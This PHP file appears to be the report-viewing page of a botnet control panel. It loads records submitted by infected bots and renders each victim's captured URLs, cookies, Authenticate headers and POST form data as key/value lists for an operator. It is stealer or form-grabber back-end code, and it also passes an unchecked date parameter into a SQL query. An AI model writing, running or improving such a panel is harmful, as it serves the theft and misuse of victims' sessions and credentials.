<?php

define("TPL_TITLE", "Report");
define("RAW_LENGTH", 100);

if (!isset($_GET["id"]) || !is_numeric($_GET["id"])) header("Location: " . DEFAULT_URI);
if (!CsrConnectToDb()) die();

if (isset($_POST["delete"])) {
	CsrSqlQuery("delete from `reports_" . date('ymd', CURRENT_TIME) . "` where `id` = " . $_GET["id"] . " limit 1");
	header("Location: cp.php?act=reports");
}

$date = substr($_GET["date"], -2) . substr($_GET["date"], 3, 2) . substr($_GET["date"], 0, 2);
$report = CsrSqlQueryRow("select `bot_id`, `rtime`, `content` from `reports_" . $date . "` where `id` = " . $_GET["id"] . " limit 1");

function SpliceRaw($v)
{
	$s = '';
	$num = strlen($v) / RAW_LENGTH;
	for ($i = 0; $i < $num; ++$i) 
	{
		if ((strlen($v) - RAW_LENGTH * $i) > RAW_LENGTH)
			$s .= substr($v, $i * RAW_LENGTH, RAW_LENGTH) . '<br/>';
		else
			$s .= substr($v, $i * RAW_LENGTH, RAW_LENGTH);
	}
	
	return $s;
}

ob_start();

$headers = array("Url", "Referer", "User-Agent", "Cookie", "Authenticate", "Data");

$content = '';
$parts = explode("\n", urldecode($report["content"]));

foreach ($parts as $k => $v)
{
	$p = explode(':', $v, 2);
	
	if (in_array($p[0], $headers))
	{
		$s = "<b>" . $p[0] . "</b>:";
		
		if ($p[0] == "Data" && isset($p[1])) 
		{
			$s = $s . "<br/>";
			$q = explode('&', $p[1]);
			
			for ($i = 0; $i < count($q); ++$i)
			{
				if (!strlen($q[$i])) continue;
			
				$b = explode('=', $q[$i], 2);
				
				$s .= '[' . trim($b[0]) . ']='. SpliceRaw($b[1]) . "<br>";
			}
		}
		else if ($p[0] == "Cookie" && isset($p[1]))
		{
			$arr = explode(';', $p[1]);
			
			$s = "<b>" . $p[0] . "</b>:<br/>";
			
			for($i = 0; $i < count($arr); ++$i)
			{
				$k = $arr[$i];
				if (!strlen($k)) continue;
				
				$r = explode('=', $k, 2);
				
				if (isset($r[0]))
				{
					$k = '[' . trim($r[0]) . ']=' . SpliceRaw($r[1]);
				}
				
				if ($i == (count($arr) - 1)) {
					$s .= $k;
				}
				else
					$s .= $k ."<br/>";
			}
		}
		else
		{
			$s .= SpliceRaw($p[1]);
		}
		
		$content .= $s . '<br/>';
	}
}

?>

<form method="post"> 
<div class="row col-md-12">
	<table class="table table-striped table-bordered table-condensed table-hover">
		<tr>
			<td> Bot id: </td> <td><a href="?act=bot&id=<?=$report["bot_id"]?>"> <?=$report["bot_id"]?> </a> </td>
		</tr>
		<tr>
			<td> Time created: </td> <td><?=date("d-m-Y H:i:s", $report["rtime"])?></td>
		</tr>
		<tr>
			<td colspan='2'> <?=@$content?> </td>
		</tr>
	</table>
</div>
</form>

<?php
$content = ob_get_contents();
ob_end_clean();

$header_tpl = file_get_contents(TPL_PATH . "header.html");
$header_tpl = str_replace(array("{TPL}", "{SCRIPTS}", "{TITLE}"), array(TPL_PATH, "", TPL_TITLE), $header_tpl);

$menu_tpl = file_get_contents(TPL_PATH . "menu.html");
$menu_tpl = str_replace(array("{CUR_TIME}", "{REPORTS_ACTIVE}"), array(gmdate("M d Y H:i:s", mktime()), "active"), $menu_tpl);

$body_tpl = file_get_contents(TPL_PATH . "body.html");
$body_tpl = str_replace(array("{MENU}", "{BODY_CLASS}", "{CONTENT}"), array($menu_tpl, "bots", $content), $body_tpl);
$footer_tpl = file_get_contents(TPL_PATH . "footer.html");

echo str_replace(array("{HEADER}", "{BODY}", "{FOOTER}"), array($header_tpl, $body_tpl, $footer_tpl), file_get_contents(TPL_PATH . "main.html"));
?>